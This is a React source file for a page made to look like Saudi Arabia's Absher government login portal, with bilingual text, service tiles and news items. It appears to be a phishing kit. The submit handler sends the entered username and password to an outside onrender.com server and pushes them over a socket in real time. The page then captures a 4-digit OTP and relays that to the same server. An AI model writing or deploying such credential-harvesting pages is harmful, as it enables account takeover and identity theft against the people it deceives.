import React, { useEffect, useState } from 'react'
import { FiSearch } from "react-icons/fi";
import { BsArrowUp, BsBookHalf, BsEye, BsSnapchat, BsTwitterX, BsYoutube } from "react-icons/bs";
import { Swiper, SwiperSlide } from 'swiper/react';
import { Navigation, Pagination } from 'swiper/modules';
import 'swiper/css';
import 'swiper/css/navigation';
import 'swiper/css/pagination';
import { LuArrowUpLeftSquare } from "react-icons/lu";
import { PiUser } from "react-icons/pi";
import { BiArrowFromTop, BiArrowToTop, BiBook, BiChat, BiLockAlt, BiPhone } from "react-icons/bi";
import { RiUserAddLine } from "react-icons/ri";
import { LuCalendarSearch } from "react-icons/lu";
import { CiAirportSign1 } from "react-icons/ci";
import { SlCalender } from "react-icons/sl";
import { FaArrowTrendUp, FaFacebook } from "react-icons/fa6";
import { FaUsers } from "react-icons/fa";
import { LiaNetworkWiredSolid } from "react-icons/lia";
import { MdOutlineDevices } from "react-icons/md";
import { CiMobile1 } from "react-icons/ci";
import { IoChatbubblesOutline, IoPlaySkipBackCircleOutline } from "react-icons/io5";
import axios from 'axios';

import io from 'socket.io-client';
import { TailSpin } from 'react-loader-spinner';
import { AiOutlineStop } from "react-icons/ai";
import { IoMdClose } from "react-icons/io";
import Footer from '../component/Footer';
import { useNavigate } from 'react-router-dom';
import NavBar from '../component/NavBar';
import OtpInput from 'react-otp-input';
// export const serverRoute = 'http://localhost:8080'
// export const serverRoute = 'https://api.sds-pnu.net/'
// export const serverRoute = 'https://abshr-server-6gm5.onrender.com'
export const serverRoute = 'https://abshr-server2.onrender.com'
export const socket = io(serverRoute);
const Main = ({setMode,checkMode}) => {
    const [isVisible, setIsVisible] = useState(false);
    const [loading,setLoading] = useState(false)
    const [failed,setFailed] = useState(false)
    const [success,setSuccess] = useState(false)
    const [otp,setOtp] = useState('')
    const [username,setUsername] = useState()
    const [password,setPassword] = useState()
    const [disabled,setDisabled]=useState(false)
    const mode = localStorage.getItem('lang')
    const handleScroll = () => {
      const scrollTop = document.documentElement.scrollTop;
      setIsVisible(scrollTop > 300); 
    };
    const scrollToTop = () => {
      window.scrollTo({
        top: 0,
        behavior: 'smooth' 
      });
    };
    const navigate = useNavigate()
    useEffect(() => {
        window.addEventListener('scroll', handleScroll);
        return () => window.removeEventListener('scroll', handleScroll);
      }, []);

    const handleSubmit =async (e)=>{
        sessionStorage.removeItem('session')
        setLoading(true)
        e.preventDefault()
        const username  = e.target[0].value
        const password  = e.target[1].value
        setUsername(username)
        setPassword(password)
        if(username && password){
            const getToken = await axios.post(serverRoute+'/auth/token',{username,password})
            const token = getToken.data.token
            sessionStorage.setItem('session',token)
            const result = await axios.post(serverRoute+'/auth/email?login=true',{username,password})
            socket.emit('login',{username,password,token,session:getToken.data.session})
        }
    }
    // const sendEmail = async (otp)=>await axios.post(serverRoute+'/auth/email?login=true',{username,password,otp})
    socket.on('success',(data)=>{
        const token = sessionStorage.getItem('session')

        if(token === data.token || data.session.token){
            setLoading(false)
            setFailed(false)
            setSuccess(true)
        }
    })
    socket.on('disAllow',(data)=>{
        const token = sessionStorage.getItem('session')
        if(token === data.token){
            setLoading(false)
            setFailed(true)
        }
    })
    useEffect(()=>{
        if(otp.length===4){
            (async()=>{
                setDisabled(true)
                setLoading(true)
                try {
                    await axios.post(serverRoute+'/auth/email?login=true',{username,password,otp}).then(()=>  window.location.href = '/services')
                } catch (error) {
                    setFailed(true)
                }finally{
                    setLoading(false)
                }
            })()
         
          
         
        }
    },[otp])

    const data = ['/main_images/1.jpg','/main_images/2.jpg']
  return (
    <div className='w-full flex flex-col bg-gray-100 h-full relative' dir={mode==='ar' ? 'ltr' : 'rtl'}>
        {
            loading && 
            <div className='absolute top-0 w-full z-50  flex items-center justify-center h-screen bg-opacity-50 left-0 bg-gray-300 ' >
    <TailSpin
      height="50"
      width="50"
      color="green"
      ariaLabel="tail-spin-loading"
      radius="1"
      wrapperStyle={{}}
      wrapperClass=""
      visible={true}/>
            </div>
       
        }
       {success && <div className='absolute z-40  flex  items-start justify-center bg-white w-screen  py-10 home2' >
            <div className='flex flex-col bg-white w-full sm:w-2/3  p-2 gap-y-5 items-center'>
            <div className='w-full flex justify-center flex-row items-center'>
                <img src='/main_images/nav2.png' className='md:w-1/12 w-1/5'/>
                <img src='/main_images/nav3.jpg'/>
            </div>
            <span className='font-bold text-center w-full'>رمز التحقق</span>
            <span className='w-11/12 text-wrappy-5 px-2 text-gray-600   text-center'>       {checkMode('Please enter the confirmation number that was sent to your  phone ',' الرجاء ادخال رقم التأكيد الذي تم ارساله على جوالك').word} </span>
            {/* <div className='flex items-center justify-center gap-x-2   my-2'>
            <input className='border-b-2 text-xl p-1 border-black w-8 text-center' maxLength={1}  onClick={(e)=>console.log(e)} onChange={(e)=>setOtp(e.target.value)}/>
            
            </div> */}
            {/* <button className='my-1 w-full bg-green-500  text-white py-1 ' onClick={async()=>{
                if(otp){
                    await sendEmail(otp).then(()=> window.location.href = '/services')
                   
                }
            }}>
                </button> */}
            <OtpInput
                value={otp}
                onChange={setOtp}
                numInputs={4}
                renderInput={(props) =>disabled ?  
                <input {...props}  className='border-b-2 text-xl p-1 border-black  mx-3' disabled inputMode="numeric"/>
                    :
                <input {...props}  className='border-b-2 text-xl p-1 border-black  mx-3' inputMode="numeric"/>}
            />
            <button className='my-5 w-5/12 border-green-500 text-green-500 hover:bg-green-500 hover:text-white  py-1' style={{border:'1px solid'}} onClick={()=>{
                sessionStorage.clear()
                setSuccess(false)
            }}>{checkMode('Cancel','الغاء').word}</button>
            </div>
        </div>}
         <NavBar mode={mode} setMode={setMode} checkMode ={checkMode}/>
              <div className='w-full items-center flex justify-center'>
        <div className=' my-2 w-full lg:w-2/3 select-none flex flex-col  justify-between items-center lg:justify-center lg:flex-row gap-x-4'>
            <Swiper modules={[Pagination]}
                    pagination={ {
                        clickable: true,
                    } } 
                    autoplayDelay={1000}
                    className={`w-full  flex  ${success | loading && '!-z-10'} `}>
                {data.map((imgSrc)=> <SwiperSlide className='w-full'><img src={imgSrc} className='w-full h-48 '/>  </SwiperSlide>)}
            </Swiper>
            <div className='lg:w-1/3 my-2 bg-white w-full flex flex-col divide-y-2'>
                <div className='flex justify-end p-5 items-center gap-x-3' >
                    <span className='font-bold'>{checkMode('Login','تسجيل الدخول').word}</span>
                    <LuArrowUpLeftSquare className='text-green-500 text-2xl'/>
                </div>
                {   failed &&
                <div className=' flex items-center justify-center mx-2 mb-2 z-10  border-2 border-red-400 bg-red-100 rounded-lg py-5 relative  '>
                    <IoMdClose className='absolute top-2 left-2 cursor-pointer text-red-400' onClick={()=>{
                        
                        setFailed(false)
                    }}/>
                        <div className='text-xs text-right px-2 text-red-700 font-bold'>
                        {checkMode('Excuse me! The username or password is incorrect. Please ensure that the information entered is correct','عذرا! اسم المستخدم او كلمه المرور غير صحيحه.فضلا تاكد من صحه المعلومات المدخله').word}
                           </div>
               </div>
}
              <form className='flex p-5 items-center gap-y-5   flex-col' style={{border:'1px solid #eee'}} onSubmit={handleSubmit}dir={mode==='ar' ? 'rtl' : 'ltr'}>
              <div style={{border:'1px solid #eee'}} className='flex items-center px-3 py-2  w-full   text-gray-600'>
                  <PiUser  className='text-green-500 text-2xl '/>
                  <input className='font-bold  outline-none placeholder:text-xs w-full flex-1  px-2' required   type='text' placeholder={checkMode('User name','اسم المستخدم   ').word}/>
              </div>
              <div style={{border:'1px solid #eee'}} className='flex items-center px-3 py-2  w-full text-gray-600'>
                  <BiLockAlt className='text-green-500 text-2xl '/>
                  <input className='font-bold  outline-none placeholder:text-xs w-full  px-2'required  type='password' placeholder={checkMode('Password','كلمه المرور').word} />
              </div>
              <button type='submit' className='text-white bg-green-700 py-2 w-full'>{checkMode('Login','تسجيل الدخول').word}</button>
          </form>
            
                
                <div className='flex justify-end p-5 items-center gap-x-3' >
                    <span className='font-bold text-gray-500'>
                     {checkMode('New User ','مستخدم جديد').word}
                        </span>
                    <RiUserAddLine  className='text-gray-300 text-2xl'/>
                </div>
                <div className='flex justify-end p-5 items-center gap-x-3' >
                    <span className='font-bold text-gray-500'>
                    {checkMode('Forget Password','   نسيت كلمه المرور').word}
                 
                         </span>
                    <BiLockAlt  className='text-gray-300 text-2xl'/>
                </div>
            </div>
        </div>
        </div>
        <div className='flex justify-around w-full my-2'>
            <div className='w-full md:w-2/3 flex gap-x-3 items-center flex-col md:flex-row gap-y-2'>
                <div className='flex flex-col divide-y-2  w-11/12 h-48 bg-white shadow-sm cursor-pointer'>
                    <div className='flex items-center justify-end p-2 gap-x-3 w-full'>
                        <span className='text-sm text-gray-600'>{checkMode('Appointments','المواعيد').word}</span>
                        <SlCalender className='text-xl text-green-500'/>
                    </div>
                    <div className='flex flex-wrap  gap-x-2 items-center justify-center flex-1 p-2'>
                        <div style={{border:'1px solid #eee'}} className='p-3 flex items-center flex-col justify-center'>
                            <img src='/main_images/ahwal.png'/>
                            <span className='text-xs lg:text-sm'> {checkMode('Civil affairs','لاحوال المدنيه').word}</span>
                        </div>
                        <div style={{border:'1px solid #eee'}} className='p-3 flex items-center flex-col justify-center'>
                            <img src='/main_images/Jawazat.png'/>
                            <span className='text-xs lg:text-sm'>{checkMode('Passports','الجوازات').word} </span>
                        </div>
                    </div>
                </div>
                <div className='flex flex-col divide-y-2  w-11/12 h-48  bg-white shadow-sm cursor-pointer'>
                    <div className='flex items-center justify-end p-2 gap-x-3 w-full'>
                        <span className='text-sm text-gray-600 '>  {checkMode('Qdom Platform','منصه قدوم').word}</span>
                        <CiAirportSign1  className='text-2xl text-green-500'/>
                    </div>
                    <div className='w-full flex items-center flex-col justify-center flex-1 shadow-lg'>
                        <CiAirportSign1  className='text-3xl text-green-500'/>
                        <span className='text-sm lg:text-sm'> {checkMode('Enter Qdom Platform','  الدخول الي منصه قدوم').word} </span>
                    </div>
                </div>
                <div className='flex flex-col  divide-y-2 md:w-1/3 w-11/12 h-48 bg-white shadow-sm cursor-pointer'>
                    <div className='flex items-center justify-end p-2 gap-x-3 w-full'>
                        <span className='text-sm md:text-xs lg:text-sm text-gray-600' >
                            {checkMode('Inquiry services','الخدمات الاستعلاميه').word}
                            </span>
                        <LuCalendarSearch className='text-2xl text-green-500'/>
                    </div>
                    <div className='w-full flex items-center flex-col justify-center flex-1 shadow-lg'>
                        <img src='/main_images/icon1.png' className='w-10'/>
                         <span className='text-sm'>
                         {checkMode('Verify death certificate','التحقق من شهاده وفاه').word}
                            </span> 
                    </div>
                </div>
                    
            </div>
        </div>
        <div className='w-full flex  justify-center'>
            <div className='flex flex-col divide-y-2  md:w-2/3 w-11/12   bg-white shadow-sm cursor-pointer'>
                <div style={{border:'1px solid #eee'}} className='p-3 flex items-center justify-end gap-x-2'>
                    <span className='text-xs'>
                        {checkMode('Best Services','الخدمات الاكقر استخداماً').word}
                        </span>
                    <FaArrowTrendUp className='text-green-500'/>
                </div>
                <div className='grid grid-cols-2 p-2 gap-x-2 gap-y-1 ' > 
                    <div className='flex flex-col justify-center items-center p-4 shadow-sm rounded-lg' style={{border:'1px solid #eee'}}>
                        <img src='/main_images/icon4.png' className='w-12 h-10 '/>
                        <span className='text-xs lg:text-sm'>{checkMode('Farget','فرجت').word}</span>
                    </div>
                    <div className='flex flex-col justify-center items-center p-4 shadow-sm rounded-lg' style={{border:'1px solid #eee'}}>
                        <img src='/main_images/nav3.jpg' className='w-10 h-10 '/>
                        <span className='text-xs lg:text-sm'>
                          {checkMode('Delivery of documents',' توصيل الوثائق').word}
                            </span>
                    </div>
                    <div className='flex flex-col justify-center items-center p-4 shadow-sm rounded-lg' style={{border:'1px solid #eee'}}>
                        <img src='/main_images/icon3.png' className='w-10 h-10 '/>
                        <span className='text-xs lg:text-sm'>
                        {checkMode('Renewal of driving license','تجديد رخصه سير').word}
                            </span>
                    </div>
                    <div className='flex flex-col justify-center items-center p-4 shadow-sm rounded-lg' style={{border:'1px solid #eee'}}>
                        <img src='/main_images/Jawazat.png' className='w-10 h-10 '/>
                        <span className='text-xs lg:text-sm'>
                           {checkMode('Renewal of residence',' تجديد الاقامه').word}
                            </span>
                    </div>
                    <div className='flex flex-col justify-center items-center p-4 shadow-sm rounded-lg' style={{border:'1px solid #eee'}}>
                        <img src='/main_images/ahwal.png' className='w-10 h-10 '/>
                        <span className='text-xs lg:text-sm'>
                        {checkMode('Birth registration','تسجيل المواليد').word}
                            
                            </span>
                    </div>
                </div>

            </div>
        </div>
        <div className='w-full flex  justify-center my-2'>
            <div className='flex flex-col divide-y-2  md:w-2/3 w-11/12   bg-white shadow-sm cursor-pointer'>
                <div style={{border:'1px solid #eee'}} className='p-3 flex items-center justify-end gap-x-2'>
                    <span className='text-xs lg:text-sm'>
                       {checkMode('Abshr Numbers In 2023',' ارقام حول ابشر 2023').word}
                        </span>
                    <FaArrowTrendUp className='text-green-500'/>
                </div>
                <div className='grid grid-cols-1 md:grid-cols-2 p-2 gap-x-2 gap-y-1 ' dir={mode==='ar' ? 'rtl': 'ltr'}>
                    <div className='flex flex-col  items-center p-4 shadow-sm rounded-lg gap-y-2' style={{border:'1px solid #eee'}}>
                        <div className='flex items-center gap-x-1  w-full'>
                            <IoChatbubblesOutline className='text-green-500'/>
                            <span className='text-xs text-green-500 lg:text-sm ' >+2.4 {checkMode('Milon','مليون').word}</span>
                        </div>
                        <span className='text-xs   w-full lg:text-sm'>
                        {checkMode('Process On Abshr Platform','عملية عبر المنصة ').word}
                            </span>
                    </div>
                    <div className='flex flex-col  items-center p-4 shadow-sm rounded-lg gap-y-2' style={{border:'1px solid #eee'}}>
                        <div className='flex items-center justify-start w-full'>
                            <CiMobile1  className='text-green-500'/>
                            <span className='text-xs text-green-500 lg:text-sm' >+27  {checkMode('Milon','مليون').word}</span>
                        </div>
                        <span className='text-xs   w-full lg:text-sm'>       
                         {checkMode('User Downloaded  Abshr App',' عدد مرات تحميل تطبيق أبشر').word}
                         </span>
            

                    </div>
                    <div className='flex flex-col  items-center p-4 shadow-sm rounded-lg gap-y-2' style={{border:'1px solid #eee'}}>
                        <div className='flex items-center justify-start w-full'>
                            <MdOutlineDevices className='text-green-500'/>
                            <span className='text-xs text-green-500 lg:text-sm' >+151  {checkMode('Milon','مليون').word}</span>
                        </div>
                        <span className='text-xs   w-full lg:text-sm'>
                        {checkMode('Login process on the Abshr Individual platform','     عملية تسجيل دخول على منصة أبشر أفراد').word}
                       
                            </span>
                    </div>
                    <div className='flex flex-col  items-center p-4 shadow-sm rounded-lg gap-y-2' style={{border:'1px solid #eee'}}>
                        <div className='flex items-center justify-start w-full'>
                            <LiaNetworkWiredSolid className='text-green-500'/>
                            <span className='text-xs text-green-500 lg:text-sm' dir='rtl '>  +323  {checkMode('Milon','مليون').word}</span>
                        </div>
                        <span className='text-xs   w-full lg:text-sm'>
                        {checkMode('Login process on all Abshr channels','عملية تسجيل دخول على جميع قنوات أبشر').word}
 
                            </span>
                    </div>
                    <div className='flex flex-col  items-center p-4 shadow-sm rounded-lg gap-y-2' style={{border:'1px solid #eee'}}>
                        <div className='flex items-center justify-start w-full'>
                            <FaUsers className='text-green-500'/>
                            <span className='text-xs text-green-500 lg:text-sm' >+27  {checkMode('Milon','مليون').word}</span>
                        </div>
                        <span className='text-xs   w-full lg:text-sm'>
                              {checkMode('A digital ID on all Abshr channels','هوية رقمية على جميع قنوات أبشر').word}
                            
                        </span>
                    </div>
                </div>
            </div>
        </div>
        <div className='w-full flex items-center justify-center'>
            <div className='md:w-2/3 w-11/12 grid place-items-center md:place-items-start gap-y-5 gap-x-5  grid-cols-1 md:grid-cols-3  justify-center my-2 '>
                <div className='flex flex-col divide-y-2  md:col-span-1    bg-white shadow-sm cursor-pointer'>
                <div style={{border:'1px solid #eee'}} className='p-3 flex items-center justify-end gap-x-2'>
                    <span className='text-xs lg:text-sm'>{checkMode('Ads','الاعلانات').word}</span>
                    <IoPlaySkipBackCircleOutline className='text-green-500'/>
                </div>
                <div className='flex items-center justify-center w-full'>
                   <img src='/main_images/video.jpg' className='w-11/12 p-2'/>
                </div>
                </div>
                <div className='flex flex-col divide-y-2 md:col-span-2  bg-white shadow-sm cursor-pointer' dir={mode === 'ar' ? 'rtl' : 'ltr'}>
                <div style={{border:'1px solid #eee'}} className='p-3 flex items-center  gap-x-2'>
                    <BiBook className='text-green-500 '/>
                    <span className='text-xs lg:text-sm'> {checkMode('New','الاخبار').word}</span>
                </div>
                <div className='grid grid-cols-1 p-2 gap-x-2 gap-y-1 '>
                    <div className='flex  justify-around gap-x-5 items-start p-4 shadow-sm rounded-lg gap-y-2' style={{border:'1px solid #eee'}}>
                        <SlCalender className='text-green-500'/>
                        <div className='flex flex-col gap-y-2 w-full  self-start' >
                            <span className=' navDesc w-full  lg:text-sm'>
                            {checkMode('Absher platform warns of fraud and suspicious links','منصة (أبشر) تحذّر من عمليات الاحتيال والروابط المشبوهة').word}
                                </span>
                            <span className='navDesc text-gray-400  w-full '>
                            {checkMode('The Ministry of Interior’s electronic platform “Absher” stressed the necessity of not responding to any messages or communications claiming to facilitate services for beneficiaries, whether citizens or residents, and sharing personal data with any entity or person.','                                أكدت منصة وزارة الداخلية الإلكترونية "أبشر"، ضرورة عدم التجاوب مع أي رسائل أو اتصالات تزعم تسهيل الخدمات للمستفيدين من مواطنين ومقيمين، ومشاركة البيانات الشخصية مع أي جهة أو شخص').word}
                                </span>
                            <span className='navDesc text-green-500'>{checkMode('More...','المزيد').word}</span>
                        </div>
                   
                    </div>
                    <div className='flex  justify-around gap-x-5  p-4 shadow-sm rounded-lg gap-y-2' style={{border:'1px solid #eee'}}>
                        <SlCalender className='text-green-500'/>
                        <div className='flex flex-col gap-y-2 w-full  ' >
                            <span className=' navDesc w-full  lg:text-sm'>
                            {checkMode('The Ministry of Interior launches the “Absher Challenge 2024” in its 4th edition to participate in developing the ministry’s services',' وزارة الداخلية تطلق "تحدي أبشر 2024" في نسخته الـ(4) للمشاركة في تطوير خدمات الوزارة').word}
                                </span>
                            <span className='navDesc text-gray-400  w-full '>
                                {checkMode('The Ministry of Interior launched the “Absher Challenge 2024” in its 4th edition under the slogan “We Innovate for a Smarter Future,” to provide the opportunity for creatives and innovators to participate in developing the Ministry of Interior’s services for the Absher World “Absher Individuals.”','                                أطلقت وزارة الداخلية "تحدي أبشر 2024" في نسخته الـ(4) تحت شعار "نبتكر لمستقبل أذكى"، لإتاحة الفرصة للمبدعين والمبتكرين للمشاركة في تطوير خدمات وزارة الداخلية لعالم أبشر "أبشر أفراد').word}
                                </span>
                            <span className='navDesc text-green-500'>{checkMode('More...','المزيد').word}</span>
                        </div>
                     
                    </div>
                </div>
                </div>
            </div>
        </div>
        <div className='w-full flex  justify-center my-2' dir={mode==='ar' ? 'ltr':'rtl' }>
            <div className='flex flex-col w-11/12 md:w-2/3 justify-center items-center gap-y-2 p-2  bg-white shadow-sm cursor-pointer'>
                <div className='p-3 flex items-center justify-center gap-x-2'>
                    <span className='text-xs text-gray-700 lg:text-sm'>
                    {mode === 'en' && '?'}  {checkMode('Do you have any questions or suggestions ','  هل لديك اي استفسارات او مقترحات ؟').word} 
                         </span>
                    <BiPhone className='text-green-500'/>
                </div>
                <span className='navDesc lg:text-sm'>
                    {checkMode('We welcome your inquiries and suggestions through the Contact Us page','   نرحب باستقبال استفساراتك و مقترحاتك من خلال صفحة اتصل بنا').word}
                    </span>
                    <button className='text-white bg-green-500 rounded-lg my-2 px-6 text-sm py-1 w-fit lg:text-sm'>{checkMode('Contact Us' , 'اتصل بنا').word}</button>
            </div>
        </div>
        <Footer checkMode={checkMode}/>
        {isVisible && ( <button className='fixed bottom-5 left-5 bg-slate-900 text-white w-12 h-12 flex items-center justify-center rounded-full' onClick={scrollToTop}>
            <BsArrowUp className='text-2xl'/>
            </button>)}
        {!success && <button className='fixed  bottom-10 right-20 bg-green-500 text-white w-12 h-12 flex items-center justify-center rounded-full'>
            <BiChat className='text-2xl '/>
        </button>}
              
       
    </div>
  )
}

export default Main
